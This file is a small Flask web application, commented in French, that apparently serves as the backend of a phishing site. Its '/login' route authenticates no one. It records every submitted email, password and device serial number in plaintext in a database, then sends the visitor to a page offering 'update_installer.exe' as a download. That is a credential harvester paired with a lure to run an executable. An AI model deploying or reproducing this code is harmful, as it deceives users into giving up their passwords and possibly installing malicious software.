from flask import Flask, render_template, request, redirect, url_for, send_from_directory
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users3.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    serial_number = db.Column(db.String(100), nullable=False)

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    serial_number = request.form['serial_number']

    # Ajouter l'utilisateur a la base de donnees
    new_user = User(email=email, password=password, serial_number=serial_number)
    db.session.add(new_user)
    db.session.commit()

    return redirect('/download')

@app.route('/download')
def download():
    return render_template('download.html')

@app.route('/get_update')
def get_update():
    return send_from_directory('static/dist', 'update_installer.exe')

if __name__ == "__main__":
    app.run(debug=True)
